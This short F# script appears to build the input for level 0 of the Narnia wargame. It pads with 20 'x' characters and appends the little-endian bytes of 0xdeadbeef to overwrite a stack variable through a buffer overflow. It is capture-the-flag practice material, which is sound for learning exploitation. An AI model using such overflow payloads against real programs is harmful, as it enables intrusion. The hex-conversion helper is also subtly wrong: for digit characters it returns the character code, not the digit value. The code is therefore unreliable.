open System

let hexToDec c = 
    if Char.IsDigit c 
    then int c 
    else (int c - int 'a') + 10

let hexToBytes (hex: string) = 
    hex.ToLower()
    |> Seq.chunkBySize 2 
    |> Seq.map (fun s -> 
        byte (hexToDec s.[0] * 16 + hexToDec s.[1]))
    |> Seq.toArray

let overwrite = String (hexToBytes "efbeadde" |> Array.map char)
// Narnia 0
let toInject = 
    String.replicate 20 "x" + overwrite